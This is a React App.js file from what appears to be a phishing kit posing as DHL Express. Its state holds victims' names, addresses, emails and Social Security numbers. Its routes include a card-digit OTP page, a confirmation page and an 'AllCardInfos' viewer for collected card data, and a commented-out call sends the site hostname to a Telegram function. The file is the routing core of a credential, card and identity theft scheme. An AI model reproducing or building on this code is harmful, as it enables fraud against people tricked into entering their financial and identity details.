import React, { createContext } from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import DhlExpress from "./dhlexpress";
import AllCardInfos from "./dhlexpress/cardinfo";
import Otp, { Verified } from "./dhlexpress/otp";

export const AppContext = createContext();

function App() {
  const [values, setValues] = React.useState({
    firstname: "",
    lastname: "",
    email: "",
    date: "",
    country: "United States",
    address: "",
    city: "",
    state: "",
    zip: "",
    ssn: "",
    sitename: "",
    redirecturl: "",
    verified: false,
  });

  const hostname = window.location.hostname;
  let { param } = "ioupupoi";

  /*
  useEffect(() => {
    callTelegram(hostname, param)
      .then((response) => response.text())
      .then((result) => console.log(result))
      .catch((error) => console.log("error", error));
  }, []);
  
  */

  return (
    <AppContext.Provider value={{ values, setValues }}>
      <BrowserRouter>
        <Routes>
          <Route path="/:param" element={<DhlExpress />} />
          <Route path="/sendcode/:cardigit/:param" element={<Otp />} />
          <Route path="/confirm" element={<Verified />} />
          <Route path="/info/:docId" element={<AllCardInfos />} />
        </Routes>
      </BrowserRouter>
    </AppContext.Provider>
  );
}

export default App;

/*
<Route path="/:param" element={<DhlExpress />} />
          <Route path="/sendcode/:cardigit/:param" element={<Otp />} />
          <Route path="/confirm" element={<Verified />} />
          <Route path="/info/:docId" element={<AllCardInfos />} />
*/
